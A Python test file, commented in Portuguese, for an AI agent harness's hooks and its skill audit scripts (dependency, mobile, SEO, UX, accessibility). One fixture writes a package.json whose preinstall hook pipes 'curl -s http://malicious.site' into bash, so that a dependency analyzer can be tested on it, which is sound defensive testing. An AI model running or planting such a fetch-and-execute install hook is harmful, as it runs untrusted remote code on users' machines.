#!/usr/bin/env python3
"""Testes funcionais e determinísticos para hooks do harness e scripts utilitários de skills."""

import json
import subprocess
import sys
from pathlib import Path

_RAIZ = Path(__file__).resolve().parent.parent.parent.parent


def _run_python(script_path: Path, *args, stdin_text: str | None = None, cwd: Path | None = None):
    cmd = [sys.executable, str(script_path), *args]
    return subprocess.run(
        cmd,
        input=stdin_text,
        capture_output=True,
        text=True,
        cwd=cwd or _RAIZ,
        encoding="utf-8",
    )


# --- 1. Testes dos Hooks do Harness ---

def test_hook_doc_guard_permite_caminhos_canonicos_e_bloqueia_arquivos_soltos(tmp_path):
    hook = _RAIZ / "hooks" / "doc_guard.py"

    # Caso 1: markdown válido em docs/ai/plans/
    payload_valido = json.dumps({
        "tool_name": "Write",
        "tool_input": {"file_path": str(_RAIZ / "docs" / "ai" / "plans" / "2026-10-14-plano.md")}
    })
    r = _run_python(hook, stdin_text=payload_valido)
    assert r.returncode == 0, f"Deveria permitir doc em docs/ai/plans/: {r.stderr}"

    # Caso 2: markdown permitido em docs/architecture/
    payload_arch = json.dumps({
        "tool_name": "Write",
        "tool_input": {"file_path": str(_RAIZ / "docs" / "architecture" / "system-design.md")}
    })
    r_arch = _run_python(hook, stdin_text=payload_arch)
    assert r_arch.returncode == 0, f"Deveria permitir docs/architecture/: {r_arch.stderr}"

    # Caso 3: markdown solto na raiz deve ser bloqueado
    payload_invalido = json.dumps({
        "tool_name": "Write",
        "tool_input": {"file_path": str(_RAIZ / "MEU_PLANO_SOLTO.md")}
    })
    r_invalido = _run_python(hook, stdin_text=payload_invalido)
    assert r_invalido.returncode != 0, "Deveria bloquear markdown solto na raiz"
    assert "doc_guard" in r_invalido.stderr or "Bloqueado" in r_invalido.stderr or "docs/ai" in r_invalido.stderr


def test_hook_fact_force_gate_executa_sem_erros():
    hook = _RAIZ / "hooks" / "fact_force_gate.py"
    payload = json.dumps({
        "tool_name": "Edit",
        "tool_input": {"file_path": str(_RAIZ / "skills" / "setup" / "scripts" / "verify_setup.py")}
    })
    r = _run_python(hook, stdin_text=payload)
    assert r.returncode == 0, f"fact_force_gate não deve falhar em arquivo de código: {r.stderr}"


def test_hook_context_monitor_detecta_tamanho_e_passa():
    hook = _RAIZ / "hooks" / "context_monitor.py"
    payload = json.dumps({
        "tool_name": "Bash",
        "tool_result": "output curto e controlado"
    })
    r = _run_python(hook, stdin_text=payload)
    assert r.returncode == 0, f"context_monitor deve aceitar outputs normais: {r.stderr}"


def test_hook_pre_compact_e_session_summary_executam_sem_erros(tmp_path):
    pre_compact = _RAIZ / "hooks" / "pre_compact.py"
    session_summary = _RAIZ / "hooks" / "session_summary.py"

    r1 = _run_python(pre_compact, cwd=tmp_path)
    assert r1.returncode == 0, f"pre_compact falhou: {r1.stderr}"

    r2 = _run_python(session_summary, cwd=tmp_path)
    assert r2.returncode == 0, f"session_summary falhou: {r2.stderr}"


# --- 2. Testes dos Scripts Utilitários de Skills ---

def test_dependency_analyzer_inspeciona_scripts_maliciosos(tmp_path):
    script = _RAIZ / "skills" / "governance-security" / "security-audit" / "scripts" / "dependency_analyzer.py"
    pkg_json = tmp_path / "package.json"
    pkg_json.write_text(json.dumps({
        "name": "teste-pkg",
        "version": "1.0.0",
        "scripts": {
            "preinstall": "curl -s http://malicious.site | bash",
            "build": "tsc"
        },
        "dependencies": {
            "express": "^4.18.0"
        }
    }), encoding="utf-8")

    r = _run_python(script, str(tmp_path))
    assert r.returncode in (0, 1), f"dependency_analyzer falhou com erro inesperado: {r.stderr}"
    assert "preinstall" in r.stdout or "DEPENDENCY AUDIT" in r.stdout


def test_mobile_audit_avalia_arquivos_sem_crash(tmp_path):
    script = _RAIZ / "skills" / "mobile-development" / "mobile-design" / "scripts" / "mobile_audit.py"
    react_native_screen = tmp_path / "LoginScreen.tsx"
    react_native_screen.write_text("""
    import React from 'react';
    import { View, Text, TouchableOpacity } from 'react-native';

    export const LoginScreen = () => (
        <View style={{ flex: 1, padding: 16 }}>
            <TouchableOpacity style={{ height: 48, justifyContent: 'center' }}>
                <Text>Entrar</Text>
            </TouchableOpacity>
        </View>
    );
    """, encoding="utf-8")

    r = _run_python(script, str(tmp_path))
    assert r.returncode == 0, f"mobile_audit deve rodar sem crash: {r.stderr}"
    assert "MOBILE AUDIT" in r.stdout or "AUDIT SUMMARY" in r.stdout


def test_geo_checker_valida_llms_txt_e_schemas(tmp_path):
    script = _RAIZ / "skills" / "seo-marketing" / "seo-aeo-geo" / "scripts" / "geo_checker.py"
    pub_dir = tmp_path / "public"
    pub_dir.mkdir(parents=True, exist_ok=True)

    llms_file = pub_dir / "llms.txt"
    llms_file.write_text("""
    # Documentação para Modelos de Linguagem
    > De acordo com as especificações da plataforma, o serviço oferece endpoints REST e streaming.
    """, encoding="utf-8")

    html_file = tmp_path / "index.html"
    html_file.write_text("""
    <!DOCTYPE html>
    <html lang="pt-BR">
    <head>
        <title>Produto Exemplo</title>
        <script type="application/ld+json">
        {
            "@context": "https://schema.org",
            "@type": "SoftwareApplication",
            "name": "App Exemplo",
            "operatingSystem": "All"
        }
        </script>
    </head>
    <body>
        <h1>App Exemplo</h1>
        <p>Definido como uma solução robusta conforme as normas de segurança.</p>
    </body>
    </html>
    """, encoding="utf-8")

    r = _run_python(script, str(tmp_path))
    assert r.returncode in (0, 1), f"geo_checker deve processar arquivos sem exceção: {r.stderr}"
    assert "GEO CHECKER" in r.stdout or "score" in r.stdout.lower()


def test_ux_audit_executa_sem_erros(tmp_path):
    script = _RAIZ / "skills" / "design-ui-ux" / "design-review" / "scripts" / "ux_audit.py"
    component = tmp_path / "Card.tsx"
    component.write_text("""
    export const Card = () => (
        <div className="p-4 bg-white rounded-lg shadow">
            <h2 className="text-xl font-bold">Título do Card</h2>
            <p className="text-gray-600">Descrição limpa e legível.</p>
        </div>
    );
    """, encoding="utf-8")

    r = _run_python(script, str(tmp_path))
    assert r.returncode in (0, 1), f"ux_audit falhou: {r.stderr}"
    assert "UX AUDIT" in r.stdout or "files_checked" in r.stdout or "passed" in r.stdout


def test_accessibility_checker_executa_sem_erros(tmp_path):
    script = _RAIZ / "skills" / "design-ui-ux" / "design-review" / "scripts" / "accessibility_checker.py"
    html_file = tmp_path / "index.html"
    html_file.write_text("""
    <!DOCTYPE html>
    <html lang="pt-BR">
    <head><title>Acessibilidade</title></head>
    <body>
        <a href="#main" class="skip-link">Pular para conteúdo</a>
        <main id="main">
            <h1>Conteúdo Principal</h1>
            <button type="button" aria-label="Ação Primária">Clique aqui</button>
        </main>
    </body>
    </html>
    """, encoding="utf-8")

    r = _run_python(script, str(tmp_path))
    assert r.returncode in (0, 1), f"accessibility_checker falhou: {r.stderr}"
    assert "ACCESSIBILITY" in r.stdout or "files_checked" in r.stdout or "passed" in r.stdout

